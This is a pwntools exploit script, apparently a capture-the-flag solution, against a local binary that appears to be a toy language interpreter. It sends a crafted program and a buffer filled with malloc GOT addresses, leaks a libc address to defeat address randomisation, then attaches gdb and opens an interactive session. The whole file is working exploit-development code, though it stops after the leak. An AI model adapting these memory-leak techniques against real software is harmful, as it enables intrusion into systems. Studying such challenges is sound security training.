#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './outfile'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

payload = '''begin
function
function
var b = 1;
var c = 1;
var d = 2;
end'''

lines = payload.split('\n')
print(lines)
for i in lines:
    io.recvuntil(">")
    io.sendline(i)
io.sendline('OVER')
io.recvuntil("size")
io.sendline(str(0x50))
io.recvuntil("comment:")
io.sendline(p64(elf.got['malloc']) + p64(0) * 4 + p64(elf.got['malloc']) + p64(0) * 4)
io.recvuntil("vadr")
io.recvuntil("\n")
libc_addr = myu64(io.recvn(6))
log.info("\033[33m" + hex(libc_addr) + "\033[0m")


gdb.attach(io, '''
break Analysis::StartAnalysis()
b Analysis::C(std::_List_iterator<SymInfo>)
b Analysis::A(std::_List_iterator<SymInfo>)
b Analysis::H(std::_List_iterator<SymInfo>)
b Analysis::dumpVar(std::ostream&)
''')









io.interactive()
